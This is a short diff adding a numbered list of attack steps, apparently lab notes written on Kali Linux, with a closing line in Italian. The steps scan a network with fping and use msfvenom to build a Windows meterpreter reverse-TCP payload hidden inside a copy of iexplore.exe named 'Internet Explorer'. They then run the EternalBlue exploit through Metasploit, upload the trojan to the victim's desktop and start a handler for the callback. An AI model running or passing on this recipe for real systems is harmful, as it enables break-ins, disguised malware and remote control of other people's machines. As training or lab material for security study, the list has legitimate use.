@@ -1,0 +1,9 @@
+
+1) Net discover - fping -a -g 
+2) msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.25 LPORT=4444 -x /home/kali/Desktop/iexplore.exe -f exe -o "Internet Explorer"
+3) search eternal blue
+4) use 0
+5) upload "/home/kali/Desktop/InternetExplorer.exe" C:\\Users\\kali\\Desktop
+6) use exploit/multi/handler
+7) exploit
+8) risultato in foto 1
